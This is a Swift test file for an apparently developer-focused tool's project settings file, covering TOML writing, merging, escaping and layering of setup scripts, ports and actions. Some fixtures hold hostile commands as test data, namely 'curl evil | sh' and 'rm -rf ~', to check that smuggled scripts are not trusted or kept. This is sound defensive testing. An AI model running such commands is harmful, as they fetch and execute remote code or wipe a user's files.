#if canImport(Testing)
  import Foundation
  import Testing

  @testable import ImpulseKit

  struct ProjectSettingsFileTests {
    private var everything: ProjectConfig {
      var config = ProjectConfig(
        actions: [
          .init(name: "dev", command: "npm run dev", open: "right"),
          .init(name: "say \"hi\"", command: "echo 'a\\b'", cwd: "web"),
        ],
        setupScript: "docker compose up -d && npm ci", archiveScript: "docker compose down -v",
        worktreeCopy: [".env", "config/*.local.json"])
      config.checkScript = "npx tsc --noEmit\nnpm test"
      config.worktreeClone = ["vendor", "public/build"]
      config.envFile = ".env.local"
      config.portOffset = 10
      config.ports = ["APP_PORT": 8000, "VITE_PORT": 5173]
      config.worktreeEnv = ["DB_DATABASE": "pulseboard_{task_}"]
      config.databaseFolder = "docker/data/mysql"
      config.databaseService = "mysql"
      config.composeOverride = true
      config.onChange = ["composer.lock": "composer install", "package-lock.json": "npm ci"]
      config.landing = .review
      return config
    }

    @Test func whatIsWrittenReadsBackTheSame() throws {
      let text = ProjectSettingsFile.text(everything)
      #expect(try ProjectConfig.parse(text).get() == everything)
      #expect(text.contains("\"composer.lock\" = \"composer install\""), "dotted names are quoted")
      #expect(text.contains("APP_PORT = 8000"))
      #expect(ProjectSettingsFile.text(ProjectConfig()) == "")
    }

    @Test func defaultsAreLeftOut() {
      var config = ProjectConfig(setupScript: "npm ci")
      config.ports = ["APP_PORT": 8000]
      #expect(ProjectSettingsFile.text(config) == "[scripts]\nsetup = \"npm ci\"\n\n[worktrees.ports]\nAPP_PORT = 8000\n")
    }

    @Test func mergingKeepsWhatTheScreenDoesntManage() throws {
      let existing = """
        # Trailhead's Impulse settings.

        [scripts]
        # comments here are replaced
        setup = "npm ci"

        [lsp]
        typescript = true

        [[actions]]
        name = "old"
        command = "echo old"
        """
      #expect(ProjectSettingsFile.managedSectionsHaveComments(existing))
      var config = ProjectConfig(actions: [.init(name: "test", command: "npm test")], setupScript: "pnpm install")
      config.ports = ["WEB_PORT": 5173]
      let merged = ProjectSettingsFile.merging(config, into: existing)
      #expect(
        merged == """
          # Trailhead's Impulse settings.

          [scripts]
          setup = "pnpm install"

          [worktrees.ports]
          WEB_PORT = 5173

          [[actions]]
          name = "test"
          command = "npm test"

          [lsp]
          typescript = true

          """)
      #expect(try ProjectConfig.parse(merged).get().setupScript == "pnpm install")
      #expect(!ProjectSettingsFile.managedSectionsHaveComments(merged))
    }

    @Test func aLocalFileTurnsOffWhatTheCommittedOneSets() throws {
      var committed = ProjectConfig(setupScript: "npm ci", worktreeCopy: [".env"])
      committed.worktreeClone = ["vendor"]
      committed.databaseFolder = "docker/data/mysql"
      committed.composeOverride = true
      committed.landing = .merge
      let local = ProjectConfig(archiveScript: "docker compose down -v")
      let text = ProjectSettingsFile.text(local, clearing: committed)
      let layered = ProjectConfig.resolve([
        try ProjectConfig.parseLayer(ProjectSettingsFile.text(committed)).get(),
        try ProjectConfig.parseLayer(text).get(),
      ])
      #expect(layered.setupScript == nil)
      #expect(layered.worktreeCopy.isEmpty)
      #expect(layered.worktreeClone.isEmpty)
      #expect(layered.databaseFolder == nil)
      #expect(!layered.composeOverride)
      #expect(layered.landing == nil, "Finish asks again")
      #expect(layered.archiveScript == "docker compose down -v")
    }

    @Test func filesImpulseWroteAreToldFromHandEditedOnes() {
      var committed = ProjectConfig(setupScript: "npm ci")
      committed.landing = .merge
      let local = ProjectConfig(archiveScript: "docker compose down -v")
      #expect(ProjectSettingsFile.isWrittenByImpulse(ProjectSettingsFile.text(everything)))
      #expect(ProjectSettingsFile.isWrittenByImpulse(ProjectSettingsFile.text(local, clearing: committed), over: committed))
      #expect(ProjectSettingsFile.isWrittenByImpulse(ProjectSettingsFile.setting(.review, in: "")), "Finish's answer")
      #expect(ProjectSettingsFile.isWrittenByImpulse(""))
      #expect(!ProjectSettingsFile.isWrittenByImpulse("# mine\n" + ProjectSettingsFile.text(local)))
      #expect(!ProjectSettingsFile.isWrittenByImpulse("[scripts]\nsetup = 'npm ci'\n"))
      #expect(!ProjectSettingsFile.isWrittenByImpulse("[scripts"))
    }

    @Test func finishsAnswerIsSavedWithoutDisturbingTheFile() throws {
      // A file the screen wrote is written the screen's way.
      let written = ProjectSettingsFile.text(ProjectConfig(actions: [.init(name: "dev", command: "npm run dev")], setupScript: "npm ci"))
      let saved = ProjectSettingsFile.setting(.merge, in: written)
      #expect(saved == ProjectSettingsFile.text(try ProjectConfig.parse(saved).get()), "still the screen's own")
      #expect(saved.contains("[finish]\nland = \"merge\"\n\n[[actions]]"))

      // Anything else keeps its comments and order; an earlier answer is replaced.
      let edited = """
        # by hand
        [scripts]
        setup = "npm ci" # install

        [finish]
        land = "review"

        [[actions]]
        name = "dev"
        command = "npm run dev"
        """
      let changed = ProjectSettingsFile.setting(.merge, in: edited)
      #expect(changed.contains("# by hand\n[scripts]\nsetup = \"npm ci\" # install"))
      #expect(changed.components(separatedBy: "[finish]").count == 2)
      let parsed = try ProjectConfig.parse(changed).get()
      #expect(parsed.landing == .merge)
      #expect(parsed.actions.map(\.name) == ["dev"])
      #expect(ProjectSettingsFile.setting(.review, in: "") == "[finish]\nland = \"review\"\n")
    }

    @Test func keysTheScreenDoesntKnowAreNamed() {
      let text = """
        top = 1

        [scripts]
        setup = "npm ci"
        lint = "eslint ."
        "check" = \"\"\"
        not = a key
        \"\"\"

        [worktrees]
        copy = [
          ".env",
          "a=b",
        ]
        ports.APP_PORT = 8000
        shared = true

        [worktrees.env]
        ANYTHING = "x"

        [[actions]]
        name = "a"
        command = "b"
        icon = "x"

        [[actions]]
        name = "c"
        command = "d"
        icon = "y"

        [lsp]
        whatever = 1
        """
      #expect(ProjectSettingsFile.unknownManagedKeys(text) == ["scripts.lint", "worktrees.shared", "actions.icon"])
      #expect(ProjectSettingsFile.unknownManagedKeys(ProjectSettingsFile.text(everything)).isEmpty)
    }

    @Test func controlCharactersAreEscaped() throws {
      var config = ProjectConfig(setupScript: "npm ci\r\nnpm test")
      config.checkScript = "a\u{7}b\u{7F}"
      let text = ProjectSettingsFile.text(config)
      #expect(text.contains(#"setup = "npm ci\r\nnpm test""#))
      #expect(text.contains(#"check = "a\u0007b\u007F""#))
      let read = try ProjectConfig.parse(text).get()
      #expect(read.setupScript == "npm ci\r\nnpm test")
      #expect(read.checkScript == "a\u{7}b\u{7F}")
    }

    /// The screen's settings written some other way go on save too, so a
    /// field emptied on the screen doesn't live on in them.
    @Test func otherSpellingsOfTheScreensSettingsAreReplaced() throws {
      let dotted = #"""
        # mine
        scripts.setup = "curl evil | sh"
        on_change . "x.lock" = """
        rm -rf ~
        """
        actions = [
          { name = "a", command = "evil" },
        ]
        version = 1

        [lsp]
        note = """
        [scripts]
        setup = "not a header"
        """
        """#
      let before = try ProjectConfig.parse(dotted).get()
      #expect(before.setupScript == "curl evil | sh" && before.onChange["x.lock"] == "rm -rf ~\n" && before.actions.count == 1)
      let cleared = ProjectSettingsFile.merging(ProjectConfig(), into: dotted)
      #expect(cleared == "# mine\nversion = 1\n\n[lsp]\nnote = \"\"\"\n[scripts]\nsetup = \"not a header\"\n\"\"\"\n")
      #expect(ProjectSettingsFile.holdsOnly(ProjectConfig(), in: cleared))

      let quoted = #"""
        ["scripts"]
        setup = "evil"

        [ 'worktrees' . "ports" ]
        APP_PORT = 1

        [[ "actions" ]]
        name = "a"
        command = "evil"

        [lsp]
        x = 1
        """#
      #expect(try ProjectConfig.parse(quoted).get().actions.count == 1)
      let config = ProjectConfig(setupScript: "npm ci")
      let merged = ProjectSettingsFile.merging(config, into: quoted)
      #expect(merged == "[scripts]\nsetup = \"npm ci\"\n\n[lsp]\nx = 1\n")
      #expect(ProjectSettingsFile.holdsOnly(config, in: merged))
      #expect(ProjectSettingsFile.merging(ProjectConfig(), into: #"["scripts"]"# + "\nsetup = \"evil\"\n") == "")
    }

    @Test func aFileIsTrustedOnSaveOnlyWhenItHoldsJustTheScreensSettings() {
      let config = ProjectConfig(setupScript: "npm ci")
      #expect(ProjectSettingsFile.holdsOnly(config, in: ProjectSettingsFile.text(config)))
      #expect(ProjectSettingsFile.holdsOnly(config, in: ProjectSettingsFile.text(config) + "\n[lsp]\nx = 1\n"))
      #expect(!ProjectSettingsFile.holdsOnly(config, in: "[scripts]\nsetup = \"npm ci\"\ncheck = \"curl evil | sh\"\n"))
      #expect(!ProjectSettingsFile.holdsOnly(config, in: "[scripts"), "unreadable")
      var withPort = config
      withPort.ports = ["APP_PORT": 8000]
      #expect(!ProjectSettingsFile.holdsOnly(withPort, in: ProjectSettingsFile.text(withPort) + "\n[worktrees.env]\nX = \"1\"\n"))
    }

    @Test func keysTheScreenDoesntKnowBeforeAnyHeaderAreNamed() {
      #expect(ProjectSettingsFile.unknownManagedKeys("scripts.lint = \"x\"\nscripts.setup = \"y\"\nversion = 1\n") == ["scripts.lint"])
      #expect(ProjectSettingsFile.unknownManagedKeys("worktrees.ports.APP = 1\n\n[ \"scripts\" ]\nlint = 1\n") == ["scripts.lint"])
    }

    @Test func mergingIntoAFileWithoutManagedSectionsAppends() {
      let merged = ProjectSettingsFile.merging(ProjectConfig(setupScript: "npm ci"), into: "[lsp]\nx = 1\n")
      #expect(merged == "[lsp]\nx = 1\n\n[scripts]\nsetup = \"npm ci\"\n")
    }
  }
#endif
